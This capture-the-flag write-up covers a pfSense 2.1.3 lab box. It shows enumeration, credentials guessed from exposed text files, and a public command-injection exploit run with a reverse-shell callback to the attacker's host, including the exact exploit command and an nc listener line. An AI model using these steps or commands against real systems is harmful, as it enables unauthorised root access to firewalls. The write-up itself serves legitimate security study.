## Enumeration

Initial Nmap scans show only ports 80/443 open, running lighttpd.

Navigating to the page gives us a certificate error, which we can accept and bypass. When the page loads, we can see it's a pfSense login page.

Running a `gobuster` scan shows several subdirectories, and text files we should check out, especially `changelog.txt` and `system-users.txt`.

## Initial Shell

### Logging into pfSense

First thing we should try is the default pfSense credentials of `admin:pfsense`. This doesn't work, so we need to look for credentials elsewhere.

Let's check out the `changelog.txt` file.

```
# Security Changelog 

### Issue
There was a failure in updating the firewall. Manual patching is therefore required

### Mitigated
2 of 3 vulnerabilities have been patched.

### Timeline
The remaining patches will be installed during the next maintenance window
```

I was hoping it would give us the current version, but this doesn't tell us much details, except that there apperas to be a known vulnerability still present on the target.

Let's move on to `system-users.txt`

```
####Support ticket###

Please create the following user


username: Rohit
password: company defaults
```

Interesting. So we have a username of `Rohit`, and a clue for the password being `company defaults`. I bet you the password is `pfsense`, just like the default credentials we tried earlier.

Sure enough, logging in with `rohit:pfsense` gives us access to the pfSense admin panel. We can also see that it's running version 2.1.3.

### Command Injection

In searching Exploit-DB, we can find [this exploit](https://www.exploit-db.com/exploits/43560), which is will provide us with a remote shell after exploiting a command injection vulnerability. We can copy it locally with `sspt -m exploits/php/webapps/43560.py`. We can run the exploit with `python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.15 --lport 7500 --username rohit --password pfsense`.

> Make sure you open a listener with `nc -lvnp 7500` before running!

Looking at our listener, we get back our reverse shell as expected, and it's a `root` shell!

We can grab `user.txt` from `/home/rohit/user.txt`

We can grab `root.txt` from `/root/root.txt`
